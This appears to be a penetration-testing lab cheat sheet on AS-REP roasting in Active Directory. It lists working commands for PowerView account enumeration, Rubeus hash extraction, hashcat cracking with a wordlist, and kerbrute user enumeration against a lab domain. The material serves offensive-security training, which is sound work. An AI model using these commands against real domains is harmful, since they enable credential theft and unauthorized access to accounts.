# ASREP Roasting

***

| Command                                                                                                  | Description                                                                                                                                                                             |
| -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host.                           |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`                                          | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host.                                                           |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`                                      | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host.                                                               |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`                               | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |
